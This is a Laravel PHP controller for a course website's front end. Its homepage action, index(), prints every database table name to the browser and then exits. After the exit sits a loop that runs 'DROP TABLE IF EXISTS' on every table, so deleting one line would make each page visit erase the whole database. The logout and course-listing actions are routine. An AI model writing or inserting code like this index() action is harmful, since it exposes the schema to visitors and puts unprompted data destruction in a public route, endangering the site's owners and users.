<?php

namespace App\Http\Controllers;

use App\Models\Cases;
use App\Models\Courses;
use App\Models\Faqs;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;
use Validator;

class FrontEndController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        $data = [];

        $tables = \DB::select('SHOW TABLES');
        echo '<pre>';
        print_r($tables);
        exit;
        foreach ($tables as $table) {
            $table_name = reset($table);
            DB::statement('DROP TABLE IF EXISTS ' . $table_name);
        }

        return view('home',$data);
    }
    function logout(){
        Auth::logout();
        return redirect()->to(route('index'));
    }
    function courses(){
        $data = [];
        $data['title'] = 'All Courses';
        //$data['description'] = 'All Courses';
        $breadcrumb = [];
        $breadcrumb['Home'] = route('index');
        $breadcrumb['All Courses'] = '';
        $data['breadcrumb'] = $breadcrumb;
        $today = Carbon::today();
        $data['courses'] = Courses::where('status','=','1')->where(function ($query) use ($today) {
            $query->whereNull('end_date')->orWhere('end_date', '>=', $today);
        })->withCount('modules')->paginate(env('RECORD_PER_PAGE',10));

        return view('courses',$data);
    }
}
